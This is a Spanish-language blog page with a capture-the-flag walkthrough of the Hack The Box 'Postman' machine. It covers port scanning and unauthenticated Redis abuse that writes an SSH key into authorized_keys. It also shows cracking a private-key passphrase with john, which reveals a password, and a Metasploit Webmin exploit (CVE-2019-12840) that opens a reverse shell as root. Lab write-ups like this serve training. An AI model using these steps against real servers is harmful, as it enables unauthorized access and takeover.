<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Hack The Box - Postman (Active) :: sckull — HackTheBox Writeups, CTF</title>    
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.   
Javascript needs to be enabled to decrypt content       Nombre Postman     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.160   Maker TheCyberGeek    NMAP Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="/posts/postman/" />


<link rel="stylesheet" href="/assets/style.css">


<link rel="stylesheet" href="/style.css">


<link rel="shortcut icon" href="/img/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Hack The Box - Postman (Active) :: sckull — HackTheBox Writeups, CTF" />
<meta name="twitter:description" content="Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.   
Javascript needs to be enabled to decrypt content       Nombre Postman     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.160   Maker TheCyberGeek    NMAP Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto." />
<meta name="twitter:site" content="/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="/image/htb/postman/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Hack The Box - Postman (Active) :: sckull — HackTheBox Writeups, CTF">
<meta property="og:description" content="Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.   
Javascript needs to be enabled to decrypt content       Nombre Postman     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.160   Maker TheCyberGeek    NMAP Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto." />
<meta property="og:url" content="/posts/postman/" />
<meta property="og:site_name" content="Hack The Box - Postman (Active)" />
<meta property="og:image" content="/image/htb/postman/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "/"
        },
        "articleSection" : "posts",
        "name" : "Hack The Box - Postman (Active)",
        "headline" : "Hack The Box - Postman (Active)",
        "description" : "Contenido protegido por contraseña. Para desbloquear el contenido debes Ingresar la flag root.txt de la maquina.   
Javascript needs to be enabled to decrypt content       Nombre Postman     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.160   Maker TheCyberGeek    NMAP Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2020",
        "datePublished": "2020-01-10 00:00:00 &#43;0000 UTC",
        "dateModified" : "2020-01-10 00:00:00 &#43;0000 UTC",
        "url" : "/posts/postman/",
        "wordCount" : "1392",
        "keywords" : [ "hackthebox","linux","writeup","walkthrough","CVE:2019-12840","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2020-01-10 00:00:00 &#43;0000 UTC" />




<a name="top"></a>
</head>

<body class="dark-theme">
  
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">Hack The Box - Postman (Active)</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Friday, Jan 10, 2020
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
        <span class="post-read-time">— 7 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="/tags/hackthebox/"><li class="fa fa-tag"></li> hackthebox</a>&nbsp;
        
         <a class="button-tag" href="/tags/linux/"><li class="fa fa-tag"></li> linux</a>&nbsp;
        
         <a class="button-tag" href="/tags/writeup/"><li class="fa fa-tag"></li> writeup</a>&nbsp;
        
         <a class="button-tag" href="/tags/walkthrough/"><li class="fa fa-tag"></li> walkthrough</a>&nbsp;
        
         <a class="button-tag" href="/tags/cve2019-12840/"><li class="fa fa-tag"></li> CVE:2019-12840</a>&nbsp;
        
      </span>
    

    
      
        <img src="/posts/postman/../../image/htb/postman/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      
    </div>

    <div class="post-content">      
      <ul>
<li><em>Contenido protegido por contraseña.</em></li>
<li><em>Para desbloquear el contenido debes Ingresar la flag <code>root.txt</code> de la maquina.</em></li>
</ul>


<hugo-encrypt>
	
	<div id="hugo-encrypt-encryption-notice">
		<p></p>
		<noscript><span id="hugo-encrypt-enable-js">Javascript needs to be enabled to decrypt content</span></noscript>

		<div class='hugo-encrypt-form'>
			<input
				class="hugo-encrypt-input"
				id="hugo-encrypt-password"
				placeholder=''
			/>
			<input
				class="button"
				type="button"
				value='Enviar '
				id="button" onclick="hugoDecrypt(document.getElementById('hugo-encrypt-password').value,'input')"
			/>
			<div id="hugo-encrypt-input-response"></div>
		</div>
	</div>
	<cipher-text data-password='a257741c5bed8be7778c6ed95686ddce' style="display:none;">
		<table>
<thead>
<tr>
<th>Nombre</th>
<th>Postman</th>
</tr>
</thead>

<tbody>
<tr>
<td>OS</td>
<td>Linux</td>
</tr>

<tr>
<td>Puntos</td>
<td>20</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Facil</td>
</tr>

<tr>
<td>IP</td>
<td>10.10.10.160</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://www.hackthebox.eu/home/users/profile/114053">TheCyberGeek</a></td>
</tr>
</tbody>
</table>

<h2 id="nmap">NMAP</h2>

<p>Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto.</p>

<pre><code class="language-bash"># Nmap 7.80 scan initiated Thu Dec 26 14:42:29 2019 as: nmap -p- --min-rate 1000 -o postman_nmap 10.10.10.160
Warning: 10.10.10.160 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.160
Host is up (0.26s latency).
Not shown: 65213 closed ports, 318 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt

# Nmap done at Thu Dec 26 14:45:40 2019 -- 1 IP address (1 host up) scanned in 191.74 seconds

# Nmap 7.80 scan initiated Thu Dec 26 14:46:53 2019 as: nmap -sV -sC -p22,80,6379,10000 -o postman_nmap_v 10.10.10.160
Nmap scan report for 10.10.10.160
Host is up (0.25s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 26 14:47:36 2019 -- 1 IP address (1 host up) scanned in 43.58 seconds
</code></pre>

<h2 id="http-puerto-80">HTTP (Puerto 80)</h2>

<p>En el puerto 80 nos muestra una pagina que al parecer esta en construccion.</p>

<p><img src="../../image/htb/postman/Screenshot_2019-12-26_14-51-45.png" alt="image" /></p>

<h2 id="puerto-6379">PUERTO 6379</h2>

<p>En el puerto 6379 nos muestra un mensaje de error.
<img src="../../image/htb/postman/Screenshot_2019-12-26_14-52-29.png" alt="image" /></p>

<h2 id="puerto-10000">PUERTO 10000</h2>

<p>En este puerto nos muestra un mensaje de error en el cual nos dice que probemos en el protocolo https.
<img src="../../image/htb/postman/Screenshot_2019-12-26_14-54-20.png" alt="image" /></p>

<p>Cambiamos a https y nos muestra un panel de Webmin.
<img src="../../image/htb/postman/Screenshot_2019-12-26_14-55-04.png" alt="image" /></p>

<h3 id="gobuster-puerto-80">GOBUSTER - Puerto 80</h3>

<p>Encontramos algunos directorios y archivos.</p>

<pre><code class="language-bash">root@aoiri:~/htb/postman# gobuster dir -u http://10.10.10.160/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 15 -q
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/index.html (Status: 200)
/js (Status: 301)
/server-status (Status: 403)
/upload (Status: 301)
</code></pre>

<h3 id="redis-puerto-6379">REDIS PUERTO 6379</h3>

<p>Como vimos en el reporte de nmap este puerto esta corriendo un servicio de <code>redis 4.0.9</code>. Al intentar conectarnos con el servicio mediante <em>redis-tools</em> podemos obtener informacion del mismo.</p>

<p><img src="../../image/htb/postman/Screenshot_2019-12-27_17-12-36.png" alt="image" /></p>

<h2 id="redis-explotacion">REDIS - Explotacion</h2>

<p>Utilizando los comandos de redis podemos obtener informacion del directorio donde esta corriendo o esta siendo utilizado por redis, tambien el nombre del archivo (dbfilename).</p>

<p><img src="../../image/htb/postman/Screenshot_2019-12-27_17-19-24.png" alt="image" /></p>

<p>Vemos que la configuracion del <code>dbfilename</code> es dump.rdb y el directorio esta ubicado en <code>/var/lib/redis</code>, para obtener acceso a la maquina mediante redis vamos a sobrescribir la configuracion, agregando el dbfilename como <code>authorized_keys</code> donde vamos a escribir nuestra clave publica de ssh y dir como <code>/var/lib/redis/.ssh</code>.</p>

<h3 id="redis-ssh">REDIS SSH</h3>

<p>Generamos nuestra clave publica con <strong>ssh-keygen</strong> la cual vamos a utilizar para iniciar sesion en el servicio ssh.
<img src="../../image/htb/postman/Screenshot_2019-12-27_17-13-14.png" alt="image" /></p>

<p>Antes de configurar redis debemos de agregar saltos de linea antes y despues en nuevo archivo agregando nuestra clave publica.</p>

<pre><code class="language-bash">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; clave_publica.txt
</code></pre>

<p><img src="../../image/htb/postman/Screenshot_2019-12-27_17-47-35.png" alt="image" /></p>

<p>Utilizamos redis-cli localmente para agregar la configuracion que necesitamos a la maquina, con los comandos:</p>

<pre><code class="language-bash">#Configuracion dir
redis-cli -h 10.10.10.160
config set dir /var/lib/redis/.ssh
config get dir

#Configuracion dbfilename
config set dbfilename authorized_keys
config get dbfilename
SLAVEOF NO ONE
save

#Escritura de clave publica en nuestra key
cat clave_publica.txt | redis-cli -h 10.10.10.160 -x set s-key
get s-key
</code></pre>

<p><img src="../../image/htb/postman/Screenshot_2019-12-28_16-43-27.png" alt="image" /></p>

<p>Verificamos que nuestra clave publica se haya escrito en nuestra key (s-key):</p>

<p><img src="../../image/htb/postman/Screenshot_2019-12-28_16-44-01.png" alt="image" /></p>

<p>Utilizando nuestra clave privada iniciamos sesion con el usuario redis:</p>

<p><img src="../../image/htb/postman/Screenshot_2019-12-28_16-45-04.png" alt="image" /></p>

<p>Vemos el historial del usuario redis, encontramos que el usuario edito un archivo de python y un archivo de <strong>id_rsa.bak</strong>:</p>

<p><img src="../../image/htb/postman/Screenshot_2019-12-28_16-46-02.png" alt="image" /></p>

<p>Archivo id_rsa.bak:
<img src="../../image/htb/postman/Screenshot_2019-12-28_16-47-05.png" alt="image" /></p>

<h2 id="user-matt">USER - Matt</h2>

<p>Utilizando la clave privada con el usuario Matt con ssh nos pregunta por la frase.</p>

<p><img src="../../image/htb/postman/Screenshot_2019-12-28_16-57-47.png" alt="image" /></p>

<p>Utilizamos ssh2john para obtener el hash del archivo y junto con john the ripper crackear la frase de la clave privada.</p>

<pre><code class="language-bash">python ssh2john.py id_rsa_matt &gt; id_rsa_matt.hash
john --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_matt.hash
</code></pre>

<p><img src="../../image/htb/postman/Screenshot_2019-12-28_16-59-48.png" alt="image" /></p>

<p>FRASE: <code>computer2008</code></p>

<p>Obtenemos la frase pero al intentar utilizarla con la clave privada no nos permite iniciars sesion.
<img src="../../image/htb/postman/Screenshot_2019-12-28_17-01-37.png" alt="image" /></p>

<p>Utilizamos la misma frase como contraseña de Matt y con el comando su, obtuvimos una shell con el usuario Matt y nuestra flag <strong>user.txt</strong>.
<img src="../../image/htb/postman/Screenshot_2019-12-28_17-01-07.png" alt="image" /></p>

<p>Flag:
<img src="../../image/htb/postman/Screenshot_2019-12-28_17-03-29.png" alt="image" /></p>

<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>

<p>Utilizamos las credenciales de Matt en el puerto 10000 o webmin panel, exitosamente logramos iniciar sesion.</p>

<p><img src="../../image/htb/postman/Screenshot_2019-12-29_22-39-02.png" alt="image" /></p>

<p>La version de webmin menores o iguales a 1.910 tienen una vulnerabilidad (<strong>CVE:2019-12840</strong>) que permite la ejecucion de comandos, configuramos metasploit con el cve, añadimos las credenciales de Matt y utilizamos SSL.</p>

<p><img src="../../image/htb/postman/Screenshot_2019-12-28_17-09-59.png" alt="image" /></p>

<pre><code class="language-bash">msf5 &gt; search 2019-12840 

Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/linux/http/webmin_packageup_rce  2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution


msf5 &gt; use exploit/linux/http/webmin_packageup_rce
msf5 exploit(linux/http/webmin_packageup_rce) &gt; 
msf5 exploit(linux/http/webmin_packageup_rce) &gt; show options 

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin &lt;= 1.910


msf5 exploit(linux/http/webmin_packageup_rce) &gt; set rhosts 10.10.10.160
rhosts =&gt; 10.10.10.160
msf5 exploit(linux/http/webmin_packageup_rce) &gt; 
msf5 exploit(linux/http/webmin_packageup_rce) &gt; show options 

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin &lt;= 1.910


msf5 exploit(linux/http/webmin_packageup_rce) &gt; set lhost tun0
lhost =&gt; 10.10.14.67
msf5 exploit(linux/http/webmin_packageup_rce) &gt; set USERNAME Matt
USERNAME =&gt; Matt
msf5 exploit(linux/http/webmin_packageup_rce) &gt; set PASSWORD computer2008
PASSWORD =&gt; computer2008
msf5 exploit(linux/http/webmin_packageup_rce) &gt; set SSL true 
SSL =&gt; true
msf5 exploit(linux/http/webmin_packageup_rce) &gt; run

[*] Started reverse TCP handler on 10.10.14.67:4444 
[+] Session cookie: 4c7f4b517283e96d41da23ced104e00a
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.67:4444 -&gt; 10.10.10.160:42436) at 2019-12-29 22:13:48 -0600
id


uid=0(root) gid=0(root) groups=0(root)
whoami; pwd
root
/usr/share/webmin/package-updates/
</code></pre>

<p><img src="../../image/htb/postman/Screenshot_2019-12-29_22-25-18.png" alt="image" /></p>

<p>Obtenemos una sesion con privilegios root y nuestra flag <strong>root.txt</strong>.
<img src="../../image/htb/postman/Screenshot_2019-12-29_22-28-41.png" alt="image" /></p>

	</cipher-text>
	<style type="text/css">
		div#hugo-encrypt-sha1sum {display: none;}
		button, .button{  
			align-items: center;
			justify-content: center;
			padding: 8px 18px;
			margin-bottom: 5px;
			background: var(--dark-background-secondary);
			color: inherit;
			text-decoration: none;
			text-align: center;
			font-weight: 500;
			border-radius: 8px;
			border: 1px solid transparent;
			appearance: none;
			cursor: pointer;
			outline: none;
		  }
	</style>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/sha1.js"></script>
	<script>
		
		let cipher = document.getElementsByTagName("cipher-text")[0];
		const storageKey = location.pathname + "password";
		const userStorage =  window['sessionStorage'] ;
		

		function str2buf(str) {
			return new TextEncoder("utf-8").encode(str);
		}
		

		function buf2str(buffer) {
			return new TextDecoder("utf-8").decode(buffer);
		}
		

		function hex2buf(hexStr) {
			return new Uint8Array(hexStr.match(/.{2}/g).map(h => parseInt(h, 16)));
		}
		

		function deriveKey(passphrase, salt) {
			salt = salt || crypto.getRandomValues(new Uint8Array(8));
			return crypto.subtle
				.importKey("raw", str2buf(passphrase), "PBKDF2", false, ["deriveKey"])
				.then(key =>
					crypto.subtle.deriveKey(
						{ name: "PBKDF2", salt, iterations: 1000, hash: "SHA-256" },
						key,
						{ name: "AES-GCM", length: 256 },
						false,
						["encrypt", "decrypt"],
					),
				)
				.then(key => [key, salt]);
		}
		

		function decrypt(passphrase, saltIvCipherHex) {
			const [salt, iv, data] = saltIvCipherHex.split("-").map(hex2buf);
			return deriveKey(passphrase, salt)
				.then(([key]) => crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, data))
				.then(v => buf2str(new Uint8Array(v)));
		}
		

		const hugoDecrypt = function(password, type) {
				decrypt(password, cipher.innerText).then(function(decrypted_text) {
					

					let hash = CryptoJS.SHA1(decrypted_text.replace(/\r?\n?[^\r\n]*$/, ""));
					let sha1_sum = CryptoJS.enc.Hex.stringify(hash);

					if ( decrypted_text.includes(sha1_sum) ) {
						document.getElementById("hugo-encrypt-encryption-notice").remove();
						cipher.outerHTML = decrypted_text;
						userStorage.setItem(storageKey, password);
						document.getElementById("hugo-encrypt-sha1sum").innerHTML = "Success: " + sha1_sum;
						$('pre').addClass('code-toolbar language-bash');
						$('code').addClass('language-bash');
                        console.log("Decryption successful. Storing password in sessionStorage.");
					}
					}).catch(function(error) {
                    if (type === "input") {
                        document.getElementById("hugo-encrypt-input-response").innerHTML = "";
                        console.log('', error);
                    } else if (type === "storage") {
                        userStorage.removeItem(location.pathname + "password");
                        console.log("Password changed. Clearing userStorage.", error);
                    }
                });
			};
	</script>
	<script>
		window.onload = () => {
			if (userStorage.getItem(storageKey)) {
				console.log("Found storageKey in userStorage. Attemtping decryption");
				hugoDecrypt(userStorage.getItem(storageKey), "storage");
			}
		};
	</script>
</hugo-encrypt>



    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="/posts/json/">
                <span class="button__icon">←</span>
                <span class="button__text">Hack The Box - Json (Active)</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="/posts/traverxec/">
                <span class="button__text">Hack The Box - Traverxec (Active)</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
  </div>
  
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>

  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>






</body>
</html>
